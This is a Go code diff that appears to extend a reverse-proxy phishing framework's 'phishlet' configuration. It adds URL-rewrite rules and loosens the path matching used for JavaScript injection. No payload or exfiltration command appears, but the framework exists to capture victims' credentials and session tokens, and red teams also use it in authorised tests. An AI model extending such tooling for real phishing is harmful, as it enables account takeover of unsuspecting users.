@@ -131,6 +131,7 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	rewriteUrls      []RewriteUrl
 }
 
 type ConfigParam struct {
@@ -218,20 +219,49 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type RewriteUrlTrigger struct {
+	Domains []string `mapstructure:"domains"`
+	Paths   []string `mapstructure:"paths"`
+}
+
+type RewriteUrlQuery struct {
+	Key   string `mapstructure:"key"`
+	Value string `mapstructure:"value"`
+}
+
+type RewriteUrlRewrite struct {
+	Path  string            `mapstructure:"path"`
+	Query []RewriteUrlQuery `mapstructure:"query"`
+}
+
+type ConfigRewriteUrl struct {
+	Trigger RewriteUrlTrigger `mapstructure:"trigger"`
+	Rewrite RewriteUrlRewrite `mapstructure:"rewrite"`
+}
+
+type RewriteUrl struct {
+	triggerDomains []string
+	triggerPaths   []string
+	rewritePath    string
+	rewriteQuery   []RewriteUrlQuery
+}
+
+// Add to ConfigPhishlet struct:
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Name        string              `mapstructure:"name"`
+	RedirectUrl string              `mapstructure:"redirect_url"`
+	Params      *[]ConfigParam      `mapstructure:"params"`
+	ProxyHosts  *[]ConfigProxyHost  `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter  `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken  `mapstructure:"auth_tokens"`
+	AuthUrls    []string            `mapstructure:"auth_urls"`
+	Credentials *ConfigCredentials  `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost  `mapstructure:"force_post"`
+	LandingPath *[]string           `mapstructure:"landing_path"`
+	LoginItem   *ConfigLogin        `mapstructure:"login"`
+	JsInject    *[]ConfigJsInject   `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept  `mapstructure:"intercept"`
+	RewriteUrls *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -758,6 +788,17 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+	if fp.RewriteUrls != nil {
+		for _, ru := range *fp.RewriteUrls {
+			r := RewriteUrl{
+				triggerDomains: ru.Trigger.Domains,
+				triggerPaths:   ru.Trigger.Paths,
+				rewritePath:    ru.Rewrite.Path,
+				rewriteQuery:   ru.Rewrite.Query,
+			}
+			p.rewriteUrls = append(p.rewriteUrls, r)
+		}
+	}
 	return nil
 }
 
@@ -990,7 +1031,7 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
 	}
 	for _, d := range trigger_paths {
-		re, err := regexp.Compile("^" + d + "$")
+		re, err := regexp.Compile(d)
 		if err == nil {
 			js.trigger_paths = append(js.trigger_paths, re)
 		} else {
